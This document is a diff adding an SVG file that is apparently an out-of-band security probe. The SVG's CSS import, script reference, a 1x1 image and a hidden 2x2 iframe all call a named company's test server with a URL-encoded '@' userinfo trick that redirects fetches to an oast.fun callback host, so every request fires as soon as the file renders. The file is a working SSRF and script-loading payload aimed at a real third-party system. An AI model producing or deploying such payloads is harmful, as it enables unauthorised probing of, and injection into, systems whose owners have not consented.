@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xhtml="http://www.w3.org/1999/xhtml" width="760" height="180">
+  <style>
+    @import url("https://dmctest.johndeere.com/webapi/ui/webcomponent/file_415R_v1?FileName=https%3A%2F%2Fdesign-system.orangelogic.com%40ioczmasuxkcvwrggbffg1csnwsynanrej.oast.fun%2Ffile415-browser-style-7a91%23downloader-worker.3.42.0.js%3Fmime%3D.css");
+  </style>
+  <script href="https://dmctest.johndeere.com/webapi/ui/webcomponent/file_415R_v1?FileName=https%3A%2F%2Fdesign-system.orangelogic.com%40ioczmasuxkcvwrggbffg1csnwsynanrej.oast.fun%2Ffile415-browser-script-7a91%23downloader-worker.3.42.0.js"/>
+  <rect width="760" height="180" fill="#eef7ff"/>
+  <text x="20" y="45" font-size="22">OAST browser-chain probe loaded</text>
+  <image href="https://dmctest.johndeere.com/webapi/ui/webcomponent/file_415R_v1?FileName=https%3A%2F%2Fdesign-system.orangelogic.com%40ioczmasuxkcvwrggbffg1csnwsynanrej.oast.fun%2Ffile415-browser-image-7a91%23downloader-worker.3.42.0.js%3Fmime%3D.svg" x="0" y="0" width="1" height="1"/>
+  <foreignObject x="0" y="100" width="2" height="2">
+    <xhtml:iframe src="https://dmctest.johndeere.com/webapi/ui/webcomponent/file_415R_v1?FileName=https%3A%2F%2Fdesign-system.orangelogic.com%40ioczmasuxkcvwrggbffg1csnwsynanrej.oast.fun%2Ffile415-browser-frame-7a91%23downloader-worker.3.42.0.js%3Fmime%3D.html"/>
+  </foreignObject>
+</svg>
